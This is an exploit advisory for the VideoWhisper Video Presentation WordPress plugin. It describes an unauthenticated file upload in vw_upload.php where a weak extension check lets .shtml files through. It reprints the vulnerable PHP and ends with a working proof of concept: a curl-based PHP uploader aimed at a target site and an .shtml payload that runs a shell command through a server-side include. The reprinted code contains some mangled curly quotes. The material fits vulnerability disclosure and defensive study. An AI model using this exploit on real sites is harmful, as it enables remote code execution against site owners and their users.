Vulnerability:
From wp-content/plugins/videowhisper-video-presentation/vp/vw_upload.php Allows various remote unauthenticated file uploads, among the file types is html where the last 4 characters are only being checked in a file name to match which types are allowed. Because of this .shtml can be passed through and remote code execution if SSI is allowed. The code does not do any user access validation and therefore anyone can upload the following files to an unsuspecting wordpress site: .shtml,swf,.zip,.rar,.jpg,jpeg,.png,.gif,.txt,.doc,docx,.htm,html,.pdf,.mp3,.flv,.avi,.mpg,.ppt,.pps
The
if (strstr($filename,'.php')) exit;

can be by passed by using the extension .Php but the file extension check would allow files like test.Php.shtml
<?php
if ($_GET["room"]) $room=$_GET["room"];
if ($_POST["room"]) $room=$_POST["room"];
$filename=$_FILES['vw_file']['name'];
include_once("incsan.php");
sanV($room);
if (!$room) exit;
sanV($filename);
if (!$filename) exit;
if (strstr($filename,'.php')) exit; //do not allow uploads to other folders
if ( strstr($room,"/") || strstr($room,"..") ) exit;
if ( strstr($filename,"/") || strstr($filename,"..") ) exit;
$destination="uploads/".$room."/“;
if ($_GET["slides"]) $destination .= "slides/“;
$ext=strtolower(substr($filename,-4)); $allowed=array(".swf",".zip",".rar",".jpg","jpeg",".png",".gif",".txt",".doc","docx",".htm","html",".pdf",".mp3",".flv",".avi",".mpg",".ppt",".pps”);
if (in_array($ext,$allowed)) move_uploaded_file($_FILES['vw_file']['tmp_name'], $destination . $filename);
?>loadstatus=1
CVEID: TBD
OSVDB: TBD
Exploit Code:
  videowhis_poc.php
        <?php

   $uploadfile="upexp.shtml";
   $ch =
   curl_init("http://target_site/wp-content/plugins/videowhisper-video-presentation/vp/vw_upload.php");
   curl_setopt($ch, CURLOPT_POST, true);
   curl_setopt($ch, CURLOPT_POSTFIELDS,
            array('vw_file'=>"@$uploadfile",'name'=>'upexp.shtml','room'=>'.'));
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
   $postResult = curl_exec($ch);
   curl_close($ch);
   print "$postResult";

   ?>


   upexp.shtml

   <html>

   <!--#exec cmd="/usr/bin/date > /tmp/p" -->
